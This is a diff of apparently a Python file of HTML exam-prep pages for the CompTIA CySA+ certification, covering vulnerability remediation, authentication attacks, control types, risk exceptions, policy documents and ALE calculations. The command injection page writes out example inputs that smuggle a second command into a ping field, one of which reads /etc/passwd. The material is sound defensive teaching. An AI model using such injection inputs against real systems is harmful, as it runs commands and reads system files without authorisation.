+<tr><td>Missing patch rated Critical, network vector, &ldquo;could allow remote code execution&rdquo;</td><td>Remote code execution</td><td>Patch first; block the service at the firewall until patched</td><td>Patch</td></tr>
+<tr><td>Kernel flaw lets a local user gain root</td><td>Privilege escalation</td><td>Patch; least privilege limits who can attempt it</td><td>Patch</td></tr>
+<tr><td>Service version with a known buffer overflow</td><td>Overflow vulnerabilities</td><td>Patch; DEP/NX and ASLR reduce the impact</td><td>Patch</td></tr>
+<tr><td>&ldquo;Blind SQL injection (time based)&rdquo; on a parameter</td><td>Injection flaws</td><td>Parameterized queries; least-privilege database account; input validation</td><td>Developers</td></tr>
+<tr><td>Parameter value echoed unencoded in the page</td><td>Reflected XSS</td><td>Context-aware output encoding; input validation; Content Security Policy</td><td>Developers</td></tr>
+<tr><td>Script saved in a comment runs for every visitor</td><td>Persistent XSS</td><td>Same, applied when storing and when rendering</td><td>Developers</td></tr>
+<tr><td><code>../</code> in a parameter returns a system file</td><td>Directory traversal</td><td>Don&rsquo;t put file names in user input; canonicalize and allow-list; restrict file permissions</td><td>Developers</td></tr>
+<tr><td>Include parameter fetches a remote URL</td><td>RFI (LFI if a local path)</td><td>Never pass user input to include calls; disable remote includes</td><td>Developers / configuration</td></tr>
+<tr><td>State-changing form has no anti-CSRF token</td><td>CSRF</td><td>Anti-CSRF tokens; SameSite cookies; re-authenticate sensitive actions</td><td>Developers</td></tr>
+<tr><td>URL-fetch feature reaches internal hosts or 169.254.169.254</td><td>SSRF</td><td>Allow-list destinations; block internal ranges; IMDSv2 in AWS</td><td>Developers / configuration</td></tr>
+<tr><td>Changing an ID in the URL shows another customer&rsquo;s record</td><td>Broken access control</td><td>Authorize every request on the server; deny by default</td><td>Developers</td></tr>
+<tr><td>Session cookie lacks Secure or HttpOnly</td><td>Identification and authentication failures</td><td>Set Secure, HttpOnly and SameSite; regenerate the session ID at login</td><td>Developers / configuration</td></tr>
+<tr><td>Switch or router firmware out of date</td><td>Outdated components</td><td>Apply the vendor firmware update in a maintenance window</td><td>Patch</td></tr></table></div>
+<p>Mobile devices often miss network scans because they aren&rsquo;t on the network at scan time. Cover them through mobile device management (patch enforcement, encryption, app allow-lists, remote wipe), not by waiting for them to appear in a report.</p>
+""" + T.format("A WAF rule, IPS signature or extra monitoring is a <em>compensating</em> control. When the question asks for the control that fixes the vulnerability, pick the root-cause fix (the patch, the configuration change or the code change).")),
+
+dict(id="auth-failures", o="2.4", t="Identification and authentication failures: attacks and controls", q="password spraying", h="""
+<div class="tblwrap"><table><tr><th>Attack</th><th>How it works</th><th>What it looks like in logs</th><th>Control</th></tr>
+<tr><td><strong>Brute force</strong></td><td>Many passwords against one account</td><td>A run of failures for one user</td><td>Account lockout or progressive delays; MFA</td></tr>
+<tr><td><strong>Password spraying</strong></td><td>A few common passwords against many accounts, slowly, to stay under lockout thresholds</td><td>One or a few sources, many different user names, one or two failures each (Windows 4625 or 4771 spread across accounts)</td><td>MFA; banned-password lists; alerting on failures per source rather than per account</td></tr>
+<tr><td><strong>Credential stuffing</strong></td><td>Username and password pairs stolen from another site&rsquo;s breach, tried here</td><td>Many accounts, many source addresses, and an unusually high success rate for an attack</td><td>MFA; checking new passwords against breach lists; bot detection and rate limiting</td></tr>
+<tr><td><strong>Impersonation</strong></td><td>Taking on a legitimate user&rsquo;s identity, for example by abusing an OAuth open redirect to capture their token</td><td>Logins or token use that don&rsquo;t match the user&rsquo;s devices or habits</td><td>Exact matching of registered redirect URIs; short token lifetimes; strong session handling</td></tr>
+<tr><td><strong>On-path (man-in-the-middle)</strong></td><td>The attacker relays traffic between the client and server, reading or changing it</td><td>Certificate warnings, ARP or DNS changes, a duplicate gateway MAC address</td><td>TLS with proper certificate validation; HSTS; mutual authentication or a VPN</td></tr>
+<tr><td><strong>Session hijacking</strong></td><td>Stealing or predicting a session cookie or token and replaying it</td><td>One session ID used from two places at once, or from a new country mid-session</td><td>Secure, HttpOnly and SameSite cookies; a new session ID at login; short idle timeouts; never put session IDs in URLs</td></tr></table></div>
+<p>The common thread: a password alone is the weak point. MFA blunts brute force, spraying and stuffing; protecting the session afterward blunts hijacking and impersonation.</p>
+""" + T.format("Spraying is <em>few passwords, many accounts</em>; stuffing is <em>known pairs from another breach</em>. Lockout stops brute force but not spraying, which is designed to stay under the threshold.")),
 dict(id="os-command-injection", o="2.4", t="OS command injection, step by step", q="command injection", h="""
 <p><strong>OS command injection</strong> happens when an application builds an operating-system command from user input and hands it to a shell. The shell treats certain characters as instructions, so the attacker can add commands of their own, and they run with the application&rsquo;s privileges.</p>
 <p><strong>Worked example.</strong> An internal page lets staff ping a host: the code runs <code>ping -c 4</code> followed by whatever was typed. The input <code>10.0.0.5</code> works as intended. The input <code>10.0.0.5; cat /etc/passwd</code> makes the shell run the ping and then print the password file. On Windows the same trick uses <code>&amp;</code>: <code>10.0.0.5 &amp; whoami</code>.</p>
@@ -319,6 +471,7 @@ dict(id="control-types", o="2.5", t="Control types and compensating controls", q
 <p>A <strong>compensating control</strong> provides comparable protection when the required control can&rsquo;t be used, for example isolating an unpatchable legacy server on its own VLAN behind an allow-list firewall. It needs documenting and periodic review.</p>
 <p><strong>Class vocabulary vs. CompTIA&rsquo;s.</strong> The course groups controls as <em>administrative, physical and technical</em>, with seven functions: directive, deterrent, preventive, compensating, detective, corrective and recovery. CS0-003 objective 2.5 uses <strong>managerial, operational and technical</strong>, and <strong>preventative, detective, responsive and corrective</strong>. They map closely: administrative &asymp; managerial; physical controls such as guards and locks are usually counted as operational or physical depending on the source; recovery sits under corrective. On the exam, use CompTIA&rsquo;s words.</p>
 <p><strong>Where backups fit.</strong> Taking backups doesn&rsquo;t stop an incident, so a backup is not preventative. Restoring from it repairs the damage, which makes it <strong>corrective</strong> in CompTIA&rsquo;s CS0-003 list (frameworks that list a separate <em>recovery</em> function put it there). Also note the list has <strong>responsive</strong>, a function Security+ doesn&rsquo;t use.</p>
+<p><strong>PCI DSS&rsquo;s test for a compensating control.</strong> The standard has a formal process, and its criteria are a good general yardstick. The control must meet the <em>intent and rigor</em> of the original requirement; provide a <em>similar level of defense</em>; go <em>above and beyond</em> other PCI DSS requirements (something you already had to do doesn&rsquo;t count); and be proportionate to the extra risk of not meeting the original requirement. It is usually temporary, paired with a plan to meet the original control.</p>
 """ + T.format("Category and function are separate questions. A firewall is technical (category) and preventative (function). Read whether the question asks &ldquo;type&rdquo; meaning category or function.")),
 
 dict(id="patching", o="2.5", t="Patching, configuration and maintenance windows", q="rollback", h="""
@@ -334,8 +487,36 @@ dict(id="risk-exceptions", o="2.5", t="Risk responses, exceptions, policy and SL
 <tr><td><strong>Accept</strong></td><td>Knowingly live with it</td><td>Cost of fixing exceeds the risk; signed off by the risk owner</td></tr></table></div>
 <p><strong>Exceptions</strong> formalize acceptance for a specific finding: what the risk is, why it can&rsquo;t be fixed, which compensating controls apply, who approved it, and an expiry or review date.</p>
 <p><strong>Policies and governance</strong> set the rules: remediation timeframes by severity, who can approve exceptions. <strong>SLOs</strong> are the measurable targets, such as &ldquo;critical vulnerabilities on internet-facing systems fixed within 7 days&rdquo;. <strong>Prioritization and escalation</strong>: anything that misses its SLO, or is actively exploited, escalates to management.</p>
+<p><strong>What an exception request should record</strong>: the requirement being excepted; why it can&rsquo;t be met; the business or technical justification; scope and duration (an expiry date); the risks created; the compensating controls; the plan to come into compliance; and any risks left unmitigated. Name who has authority to approve it.</p>
+<p><strong>Accepting a risk is a decision, not a default.</strong> Saying &ldquo;we accept it&rdquo; without analysis, documentation and an approver is an unmanaged risk, not an accepted one.</p>
 """ + T.format("Insurance transfers financial loss, not the risk itself. You still suffer the breach.")),
 
+
+dict(id="policy-framework", o="2.5", t="Policies, standards, procedures and guidelines", q="policy", h="""
+<p>An organization&rsquo;s security policy framework is a set of documents at different levels of detail. Questions test which document type fits a description.</p>
+<div class="tblwrap"><table><tr><th>Document</th><th>What it says</th><th>Mandatory?</th><th>Approved by and how often it changes</th><th>Example</th></tr>
+<tr><td><strong>Policy</strong></td><td>Management&rsquo;s intent: what must be protected and who is responsible</td><td>Yes</td><td>Senior leadership; rarely</td><td>&ldquo;All sensitive data must be protected according to its classification.&rdquo;</td></tr>
+<tr><td><strong>Standard</strong></td><td>Specific requirements that carry out a policy</td><td>Yes</td><td>Lower level (the CISO or a committee); more often</td><td>Required encryption settings for laptops; password length</td></tr>
+<tr><td><strong>Procedure</strong></td><td>Step-by-step instructions for a task</td><td>Yes</td><td>Process owners; as the process changes</td><td>How to apply patches; who to notify within how many days after a card breach</td></tr>
+<tr><td><strong>Guideline</strong></td><td>Advice and best practice</td><td><strong>No</strong></td><td>Varies</td><td>Recommended ways to adopt electronic signatures</td></tr></table></div>
+<p><strong>Common policies</strong>: information security policy (the top-level authority), acceptable use, data ownership, data classification, data retention, account management (provisioning to decommissioning), password, continuous monitoring, and code of conduct or ethics. In practice the boundaries blur: many organizations put password rules in a standard rather than a policy.</p>
+<p><strong>SLO vs SLA.</strong> A <strong>service-level objective</strong> is a measurable target, such as 99.99% uptime or &ldquo;critical vulnerabilities on internet-facing systems fixed within 7 days.&rdquo; A <strong>service-level agreement</strong> is the contract that records SLOs with a customer or vendor, often with penalties for missing them.</p>
+<p><strong>Governance</strong> ties it together: who approves policies, who may grant exceptions, and how compliance is checked. Frameworks behind the documents can be <em>prescriptive</em> (do exactly this, as PCI DSS largely is) or <em>risk-based</em> (decide controls from your own risk assessment, as the NIST Cybersecurity Framework is).</p>
+""" + T.format("If compliance is optional, it is a guideline. If it gives exact steps, it is a procedure. If it names specific settings or technologies, it is a standard. If it states intent and responsibility at a high level, it is a policy.")),
+
+dict(id="risk-calc", o="2.5", t="Measuring risk: likelihood, impact, SLE and ALE", q="risk", h="""
+<p>Risk is the combination of a threat and a vulnerability it can exploit; remove either and that risk is gone. Its size depends on two things: <strong>likelihood</strong> (probability) and <strong>impact</strong> (magnitude). Risk management principles (accept, transfer, avoid, mitigate) only make sense once you have ranked risks this way. The formulas below are general knowledge rather than a CS0-003 bullet, but questions use the vocabulary.</p>
+<p><strong>Quantitative assessment</strong> puts money on it:</p>
+<div class="tblwrap"><table><tr><th>Term</th><th>Meaning</th><th>Formula</th></tr>
+<tr><td>AV (asset value)</td><td>What the asset is worth: replacement cost, or the revenue it produces</td><td>&mdash;</td></tr>
+<tr><td>EF (exposure factor)</td><td>Fraction of the value lost in one incident</td><td>0&ndash;100%</td></tr>
+<tr><td>SLE (single loss expectancy)</td><td>Loss from one incident</td><td>AV &times; EF</td></tr>
+<tr><td>ARO (annualized rate of occurrence)</td><td>Expected incidents per year (once every four years = 0.25)</td><td>&mdash;</td></tr>
+<tr><td>ALE (annualized loss expectancy)</td><td>Expected loss per year</td><td>SLE &times; ARO</td></tr></table></div>
+<p><strong>Worked example.</strong> A branch office file server and its data are valued at $60,000. A flood would destroy about half of it (EF 50%), so SLE = $30,000. The site floods about once every five years (ARO 0.2), so ALE = $6,000. A $2,500-a-year control that prevents the loss is worth buying on cost alone; a $9,000-a-year one is not, unless something other than money (safety, regulation) justifies it.</p>
+<p><strong>Qualitative assessment</strong> uses ratings instead, typically a grid of likelihood (low, medium, high) against impact (low, medium, high). It suits risks that are hard to price, such as reputation or safety. Many organizations combine the two: numbers where they exist, ratings where they don&rsquo;t.</p>
+<p>A <strong>business impact analysis</strong> (BIA) is the structured exercise that produces these ratings for each business process and system.</p>
+""" + T.format("Work the formulas in order: SLE = AV &times; EF first, then ALE = SLE &times; ARO. A once-in-ten-years event has an ARO of 0.1, not 10.")),
 dict(id="attack-surface", o="2.5", t="Attack surface management", q="bug bounty", h="""
 <ul><li><strong>Edge discovery</strong>: find everything you expose to the internet, including forgotten subdomains, cloud instances and shadow IT (certificate transparency logs, DNS enumeration, internet-wide scan data).</li>
 <li><strong>Passive discovery</strong>: map assets without touching them, from DNS records, traffic monitoring and public data.</li>
